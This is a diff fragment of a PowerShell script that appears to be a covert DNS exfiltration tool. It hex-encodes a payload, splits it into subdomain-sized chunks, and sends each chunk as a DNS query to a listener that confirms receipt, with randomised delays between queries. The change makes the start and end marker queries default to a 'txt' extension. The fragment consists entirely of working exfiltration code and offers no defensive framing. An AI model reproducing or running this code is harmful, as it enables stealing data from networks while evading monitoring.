@@ -120,14 +120,13 @@ if ($DnsQuery.IPAddress -ne "0.0.0.0") { --$global:base }}
 # Main Function
 Show-Banner ; Show-Info
 if ($args -like "-random") { $Random = "True" } 
-if ($extension) { do { $DnsQuery = DnsQuery "$extension.start" ; $DnsQuery } until ($DnsQuery.IPAddress -eq "0.0.0.0") }
-else { do { $DnsQuery = DnsQuery "start" ; $DnsQuery } until ($DnsQuery.IPAddress -eq "0.0.0.0") }
+if ($Extension) { do { $DnsQuery = DnsQuery "$Extension.start" ; $DnsQuery } until ($DnsQuery.IPAddress -eq "0.0.0.0") }
+else { $Extension = "txt" ; do { $DnsQuery = DnsQuery "$Extension.start" ; $DnsQuery } until ($DnsQuery.IPAddress -eq "0.0.0.0") }
 $Payload | out-string | thx | chunks $DomainLength | dots $SubdomainLength | % {
 if ($DelayMin -lt $DelayMax) { Start-Sleep -Milliseconds (Get-Random -Minimum $DelayMin -Maximum $DelayMax) }
 else { if ($DelayMin -gt 0) { Start-Sleep -Milliseconds $DelayMin }}
 do { $DnsQuery = DnsQuery $_ ; $DnsQuery } until ($DnsQuery.IPAddress -eq "0.0.0.0") }
-do { $DnsQuery = DnsQuery "$extension.end" ; $DnsQuery } until ($DnsQuery.IPAddress -eq "0.0.0.0") }
-else { do { $DnsQuery = DnsQuery "end" ; $DnsQuery } until ($DnsQuery.IPAddress -eq "0.0.0.0") }
+do { $DnsQuery = DnsQuery "$Extension.end" ; $DnsQuery } until ($DnsQuery.IPAddress -eq "0.0.0.0") }
 Write-Host ; Write-Host "[+] Done!" -NoNewLine -ForegroundColor Green
 
 # Decode Function
